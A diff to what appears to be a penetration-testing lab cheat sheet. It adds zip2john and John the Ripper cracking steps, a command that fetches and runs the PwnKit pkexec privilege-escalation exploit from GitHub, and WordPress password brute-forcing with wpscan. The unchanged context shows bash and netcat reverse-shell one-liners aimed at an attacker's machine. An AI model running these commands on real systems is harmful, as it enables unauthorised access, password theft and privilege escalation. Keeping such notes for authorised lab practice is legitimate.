@@ -137,6 +137,8 @@ Hydra is a parallelized login cracker which supports numerous protocols to attac
 John the Ripper is an Open Source password security auditing and password recovery tool available for many operating systems
 
 ```
+zip2john XXX.zip > hash.txt
+
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
@@ -192,6 +194,26 @@ bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
 ```
 nc $kaliIP 80 -e /bin/sh
 ```
+
+### [CyberChef](https://gchq.github.io/CyberChef/)
+a web app for encryption, encoding, compression and data analysis.
+
+### [PwnKit](https://github.com/ly4k/PwnKit)
+Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation
+```
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+```
+
+### [wpscan](https://wpscan.com/)
+```
+wpscan --url $URL 
+
+# bruteforce 
+wpscan --url $URL --passwords /usr/share/wordlists/rockyou.txt --usernames $USERNAME
+```
+
+
+
 ## Walkthrough Labs
 
 ### TryHackMe
@@ -295,12 +317,12 @@ nc $kaliIP 80 -e /bin/sh
 - [ ] [BBScute]()
 - [ ] [Blogger]()
 - [ ] [DC-9]()
-- [ ] [DriftingBlue6]()
-- [ ] [eLection]()
-- [ ] [FunboxEasyEnum]()
-- [ ] [Gaara]()
+- [X] [DriftingBlue6]()
+- [X] [eLection]()
+- [X] [FunboxEasyEnum]()
+- [X] [Gaara]()
 - [ ] [InsanityHosting]()
-- [ ] [Loly]()
+- [X] [Loly]()
 - [ ] [Monitoring]()
 - [ ] [Potato]()
 - [ ] [Stapler]()
